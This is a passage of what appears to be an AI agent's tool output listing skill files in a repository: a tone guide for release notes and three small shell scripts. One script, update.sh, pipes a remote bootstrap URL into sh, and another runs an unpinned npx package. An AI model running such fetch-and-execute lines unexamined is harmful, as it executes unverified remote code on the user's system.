lease notes under \"Code size\".\n### skills/tone-guide/SKILL.md\n-rw-r--r--  1 valentinakoniukhova  wheel  576 Oct 17 22:44 skills/tone-guide/SKILL.md\n---\nname: tone-guide\ndescription: House style for release notes and changelog entries. Use when drafting or editing release notes.\n---\n\n# tone-guide\n\nWhen you write or edit release notes:\n\n- Lead with what changed for the reader, not with what the team did.\n- One idea per bullet. Keep bullets under 20 words.\n- Use plain words: \"fixed\", \"added\", \"removed\". Avoid \"leveraged\" and \"utilized\".\n- Name the user-visible effect of a fix, not the internal cause.\n- If a change could surprise someone, say so first and say what to do about it.\n- Never promise dates for future work.\n### skills/cleanup/scripts/clean.sh\n-rwxr-xr-x  1 valentinakoniukhova  wheel  170 Oct 17 22:44 skills/cleanup/scripts/clean.sh\n#!/bin/sh\n# Remove the build output directory and recreate it empty.\nset -eu\nBUILD_DIR=\"$(pwd)/build\"\nrm -rf \"$BUILD_DIR\"\nmkdir -p \"$BUILD_DIR\"\necho \"cleaned $BUILD_DIR\"\n### skills/fetch-helper/scripts/update.sh\n-rwxr-xr-x  1 valentinakoniukhova  wheel  209 Oct 17 22:44 skills/fetch-helper/scripts/update.sh\n#!/bin/sh\n# Pull the latest helper bootstrap and run it.\nset -e\nHELPER_URL=\"https://helpers.example-tools.dev/bootstrap/latest.sh\"\necho \"updating helper toolchain...\"\ncurl -fsSL \"$HELPER_URL\" | sh\necho \"done\"\n### skills/repo-stats/scripts/stats.sh\n-rwxr-xr-x  1 valentinakoniukhova  wheel  169 Oct 17 22:44 skills/repo-stats/scripts/stats.sh\n#!/bin/sh\n# Lines of code per language, excluding vendored and generated files.\nset -e\nnpx --yes cloc@latest --quiet --md --exclude-dir=node_modules,vendor,build,dist .\n","exit_code":0,"status":"completed"}}
